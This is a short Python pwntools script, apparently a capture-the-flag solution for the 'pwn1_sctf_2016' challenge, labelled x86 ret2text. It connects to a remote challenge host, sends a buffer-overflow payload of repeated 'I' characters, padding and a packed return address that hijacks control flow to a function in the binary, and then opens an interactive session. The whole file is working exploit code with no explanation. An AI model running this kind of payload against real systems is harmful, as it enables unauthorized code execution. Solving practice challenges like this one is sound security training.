#Made by fly_autumn
#x86 ret2text
from pwn import *
#p = process("./pwn1_sctf_2016")
p = remote("node5.buuoj.cn",28501)
elf = ELF("./pwn1_sctf_2016")
libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6")
context(arch="i386",os="linux")

func = 0x8048f0d
payload = b"I"*21 + b"0" + p32(func)
p.sendline(payload)

p.interactive()
